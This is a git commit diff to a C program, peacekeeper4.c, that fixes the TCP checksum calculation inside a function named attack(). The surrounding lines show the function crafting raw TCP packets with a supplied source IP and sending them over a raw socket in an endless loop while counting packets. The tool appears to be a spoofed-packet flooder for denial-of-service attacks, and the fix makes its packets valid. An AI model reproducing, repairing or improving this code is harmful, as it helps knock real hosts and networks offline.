038acb4a00cc674546cac8d9944ec5524b36c1b9
darkness <73371463+darknessz0rz@users.noreply.github.com>
2022-08-09 05:05:56 -0500

    Attempt @ checksum validation fix

--- peacekeeper4.c
+++ peacekeeper4.c
@@ -351,7 +351,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
     // Calculate TCP checksum
-    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
     while (true)
     {
@@ -503,7 +503,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
         // Calculate TCP checksum
-        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
         // Send our newly modified loop packet.
         sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
